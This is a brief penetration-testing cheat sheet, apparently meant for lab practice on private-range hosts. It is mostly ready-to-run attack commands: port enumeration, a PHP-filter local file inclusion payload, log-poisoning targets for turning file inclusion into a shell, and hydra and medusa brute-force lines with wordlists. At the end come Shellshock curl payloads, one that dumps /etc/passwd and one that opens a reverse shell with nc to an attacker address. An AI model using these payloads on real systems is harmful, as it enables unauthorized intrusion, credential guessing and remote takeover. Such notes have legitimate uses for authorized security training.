## Enum

### nmap
```
masscan -p1-65535 10.1.1.1 --rate=1000 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

nmap -Pn -sV -sC -p$ports 10.1.1.1
```
-sT TCP </br>
-sS Syn </br>
-sU UDP </br>

LFI php source code
------
```http://10.10.10.122/dev/index.php?view=php://filter/convert.base64-encode/resource=index```

### LFI to shell
#### General Idea: chain LFI with write access
#### inject to user agent, then LFI to /var/log
```
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/httpd/access.log

others apache realated files:
 /usr/local/etc/apache22/httpd.conf
 /etc/apache2/apache2.conf
 /etc/httpd/conf/httpd.conf
 /usr/local/etc/apache22/httpd.conf
 /etc/apache2/apache2.conf
 /etc/httpd/conf/httpd.conf
```

#### LFI /proc/self/environ /proc/self/fd/
[https://highon.coffee/blog/lfi-cheat-sheet/](https://highon.coffee/blog/lfi-cheat-sheet/)
[https://www.exploit-db.com/papers/12992](https://www.exploit-db.com/papers/12992)

### Bruteforce
```
hydra -L /opt/seclist/Usernames/top-usernames-shortlist.txt -P cewl2 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=180&User=^USER^&Password=^PASS^:F=failed" -I -V

hydra -C tomcat-betterdefaultpasslist.txt -s 80 -f 10.11.1.237 http-get /webdav/ -V

hydra -l role -P tomcat-betterdefaultpasslist.txt  -e ns -t 15 -f -s -vV 10.10.10.101 -s 8080 http-get /
use -C for USER:PASS password file format
```
### TEMPLATE:
hydra -l [USERNAME] -P [WORDLIST] [TARGET] -s [Port] http-post-form "[URI-PATH-HERE] : [POST data from burp] : [Failed word]" -I -V

```
medusa -u root -P darkweb2017-top1000.txt -h 10.14.1.136 -M http -m DIR:/phpmyadmin/ -T 10
medusa -u root -P /usr/share/wordlists/rockyou.txt -h 10.14.1.11 -M mysql -n 3306 -T 16
```

### CMS stuff
```
wpscan --url $ip -e ap,tt,vt,u

droopescan scan drupal -u http://10.11.1.49/ -t 32 --enumerate ap    

cadaver 192.168.1.101/webdav

```
#### shellshock
```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.11.1.71/cgi-bin/admin.cgi

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.39 1234 >/tmp/f'" http://10.11.1.71/cgi-bin/admin.cgi
```